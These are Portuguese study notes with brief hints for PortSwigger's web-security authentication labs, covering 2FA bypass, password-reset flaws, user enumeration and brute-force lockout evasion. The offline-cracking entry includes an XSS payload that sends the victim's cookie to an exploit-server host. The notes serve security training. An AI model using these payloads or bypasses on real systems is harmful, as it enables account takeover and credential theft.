# Autenticação

Lembre-se das wordlists da PortSwigger para os ataques de força bruta:
* [Lista de Usuários](https://portswigger.net/web-security/authentication/auth-lab-usernames)
* [Lista de Senhas](https://portswigger.net/web-security/authentication/auth-lab-passwords)

<br>

## Laboratórios

**Simple 2FA Bypass**

Tente acessar o próximo endpoint diretamente (você precisa saber o nome do diretório previamente), por exemplo: `/my-account`.

Se isso não funcionar, tente mudar o header Referer como se você estivesse vindo de uma página de 2FA.

<br>
<br>

**Password Reset Broken Logic**

Mude o nome de usuário na request depois de pegar o link de reset:
```
temp-forgot-password-token=MgFMne17hOm2WM5BMHyVzvEewBFOwnyc&username=carlos&new-password-1=w&new-password-2=w
```

**User Enumeration with Different Responses**  
Olhe para a diferença da resposta quando um usuário existe ou não.

<br>
<br>

**User Enumeration with Different Response Time**

Se você ficar bloqueado, adicione o header `X-Forwarded-For` para bypassar o bloqueio.

Se o usuário existir, a resposta demorará mais tempo conforme o comprimento do password.
```
username=wiener&password=peterrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrrr
```

Adicione a coluna "Response Completed" no Intruder para analisar as respostas que levaram mais do que o comum para retornar.

<br>
<br>

**Broken brute-force protection, IP block**

Coloque uma credencial válida a cada duas tentativas de brute force.

<br>
<br>

**Username enumeration via account lock**

O segredo é utilizar um ataque de Cluster Bomb e adicionar 5 payloads como Null como segunda lista.

Isso vai testar cada usuário 5 vezes e bloquear a conta se o usuário existir.
```
username=§invalid-username§&password=example§§
```

Depois de achar o usuário, faça o brute force da senha e faça uma busca negativa por `You have made too many incorrect login attempts`.

<br>
<br>

**2FA Broken Logic**

Na request `GET /login2`, mude o valor do parâmetro `verify` para **carlos**. Isso vai gerar um código MFA para a conta dele.

Em seguida, envie a request `POST /login2` para o Intruder e descubra o MFA por força bruta.

Dica: coloque a opção "Min integer digits" como 4 dígitos para testar códigos como 0001 em vez de somente 1.

<br>
<br>

**Brute-forcing a stay-logged-in Cookie**
O cookie tem esse formato:
```
base64(username+':'+md5HashOfPassword)
```

<br>
<br>

**Offline password cracking**

Roube o cookie da vítima com XSS:
```
<script>document.location='https://exploit-0a9500710453ead384ea359b014700c2.exploit-server.net/'+document.cookie</script>
```

Utilize o Hashcat ou algum site como Crackstation para quebrar o MD5.

<br>
<br>

**Password Reset Poisoning via Middleware**

Na request para solicitar o reset de password, altere o header `X-Forwarded-Host` com a URL que você controla.

Quando a vítima clicar no link que rececer no e-mail, o token será redirecionado para o seu domínio.

<br>
<br>

**Password Brute-force via Password Change**

É possível trocar o username no processo de troca de senha. Troque o usuário e use brute force nessa request.

<br>
<br>

**Weak isolation on dual-use endpoint**

Remova o parâmetro `current-password`.

<br>
<br>

**Authentication bypass via flawed state machine**

Drope a request que envolve "role-selector".
